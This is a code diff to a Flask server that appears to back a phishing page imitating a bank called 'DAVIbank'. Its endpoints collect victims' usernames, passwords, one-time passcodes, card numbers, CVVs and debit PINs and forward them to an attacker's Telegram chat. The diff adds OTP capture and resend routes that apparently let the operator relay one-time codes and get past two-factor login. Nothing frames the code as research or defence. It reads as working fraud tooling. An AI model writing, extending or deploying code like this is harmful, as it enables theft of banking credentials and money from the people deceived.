@@ -1,7 +1,6 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
-import json
 from datetime import datetime
 import threading
 import time
@@ -13,7 +12,7 @@ PORT = 3000
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-pending_validations = {}
+pending_validations = {}  # Stores OTP and validation status
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 last_update_id = 0
 
@@ -26,23 +25,19 @@ def submit_login():
     user_id = data.get('userId')
     username = data.get('username')
     password = data.get('password')
+    otp = data.get('otp')
     
-    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
+    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username} - OTP: {otp}")
     
     pending_validations[user_id] = {
         'username': username,
         'password': password,
+        'otp': otp,
         'status': 'pending',
         'timestamp': datetime.now().isoformat()
     }
     
-    keyboard = {
-        "inline_keyboard": [[
-            {"text": "✅ VALIDAR ACCESO", "callback_data": f"validate_{user_id}"}
-        ]]
-    }
-    
-    message = (f"🔐 **NUEVA SOLICITUD DE ACCESO** 🔐\n\n"
+    message = (f"🔐 **CÓDIGO DE VERIFICACIÓN** 🔐\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID: `{user_id}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -50,12 +45,54 @@ def submit_login():
                f"👤 Usuario: {username}\n"
                f"🔑 Contraseña: {password}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
+               f"🔢 **CÓDIGO OTP:** `{otp}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-               f"⚠️ Presione el botón para validar este acceso")
+               f"⚠️ Comparta este código con el usuario para que ingrese")
     
     requests.post(f"{TELEGRAM_API}/sendMessage",
-        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
+        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+    
+    return jsonify({"success": True})
+
+@app.route('/api/verify-otp', methods=['POST', 'OPTIONS'])
+def verify_otp():
+    if request.method == 'OPTIONS':
+        return jsonify({}), 200
+    
+    data = request.json
+    user_id = data.get('userId')
+    user_otp = data.get('otp')
+    
+    if user_id in pending_validations:
+        stored_otp = pending_validations[user_id]['otp']
+        if stored_otp == user_otp:
+            pending_validations[user_id]['status'] = 'validated'
+            print(f"[{datetime.now()}] ✅ OTP verified for {user_id}")
+            return jsonify({"valid": True})
+    
+    return jsonify({"valid": False})
+
+@app.route('/api/resend-otp', methods=['POST', 'OPTIONS'])
+def resend_otp():
+    if request.method == 'OPTIONS':
+        return jsonify({}), 200
+    
+    data = request.json
+    user_id = data.get('userId')
+    username = data.get('username')
+    password = data.get('password')
+    new_otp = data.get('otp')
+    
+    if user_id in pending_validations:
+        pending_validations[user_id]['otp'] = new_otp
+        
+        message = (f"🔄 **NUEVO CÓDIGO OTP** 🔄\n\n"
+                   f"🆔 ID: `{user_id}`\n"
+                   f"👤 Usuario: {username}\n"
+                   f"🔢 **Nuevo código:** `{new_otp}`")
+        
+        requests.post(f"{TELEGRAM_API}/sendMessage",
+            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
     
     return jsonify({"success": True})
 
@@ -82,12 +119,10 @@ def submit_card():
                f"💳 Tarjeta: {data.get('cardNumber')}\n"
                f"📅 Expira: {data.get('expiry')}\n"
                f"🔐 CVV: {data.get('cvv')}\n"
-               f"🏧 PIN: {data.get('debitPin')}\n"
-               f"━━━━━━━━━━━━━━━━━━━━━━\n"
-               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}")
+               f"🏧 PIN: {data.get('debitPin')}")
     
     requests.post(f"{TELEGRAM_API}/sendMessage",
-        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        json={"chat_id": ADMIN_CHAT_ID, "text": message})
     
     return jsonify({"success": True})
 
@@ -113,23 +148,6 @@ def poll_telegram():
                 for update in updates['result']:
                     last_update_id = update['update_id']
                     
-                    if 'callback_query' in update:
-                        callback = update['callback_query']
-                        data = callback['data']
-                        
-                        if data.startswith('validate_'):
-                            user_id = data.replace('validate_', '')
-                            
-                            if user_id in pending_validations:
-                                pending_validations[user_id]['status'] = 'validated'
-                                print(f"[{datetime.now()}] ✅ User validated: {user_id}")
-                                
-                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
-                                    json={"callback_query_id": callback['id'], "text": "✅ Acceso validado!"})
-                                
-                                requests.post(f"{TELEGRAM_API}/sendMessage",
-                                    json={"chat_id": ADMIN_CHAT_ID, "text": f"✅ Usuario {user_id} ha sido validado exitosamente"})
-                    
                     if 'message' in update:
                         message = update['message']
                         chat_id = message['chat']['id']
@@ -137,8 +155,8 @@ def poll_telegram():
                         
                         if text == '/start':
                             welcome = ("🤖 Bot de validación DAVIbank\n\n"
-                                      "Los usuarios serán notificados aquí cuando necesiten validación.\n\n"
-                                      "Comandos:\n/status - Ver estado\n/pending - Ver pendientes")
+                                      "Los usuarios serán notificados aquí con códigos OTP.\n\n"
+                                      "Comandos:\n/status - Ver estado")
                             requests.post(f"{TELEGRAM_API}/sendMessage",
                                 json={"chat_id": chat_id, "text": welcome})
                         
